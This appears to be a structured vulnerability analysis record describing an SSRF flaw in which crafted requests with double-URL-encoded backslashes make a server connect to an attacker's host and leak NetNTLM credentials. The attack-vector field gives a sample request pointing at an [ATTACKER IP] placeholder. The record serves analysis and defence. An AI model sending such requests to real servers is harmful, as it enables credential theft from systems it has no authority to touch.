{
  "Root cause of vulnerability": "The application processes specially crafted HTTP requests that include encoded backslashes and an attacker controlled IP, causing it to initiate a connection to the attacker's server.",
  "Weaknesses/vulnerabilities present": "Server-Side Request Forgery (SSRF)",
  "Impact of exploitation": "The vulnerable server connects to an attacker-controlled IP address and sends its NetNTLM credentials to the attacker.",
  "Attack vectors": "Sending a crafted HTTP GET request to the vulnerable server containing URL-encoded backslashes followed by the attacker's IP address. For example: GET /%255c%255c[ATTACKER IP]%255cC$%255cbb HTTP/1.1",
   "Required attacker capabilities/position": "The attacker needs to be able to send HTTP requests to the vulnerable server. The attacker also needs a server to receive the connection and capture the NetNTLM credentials."
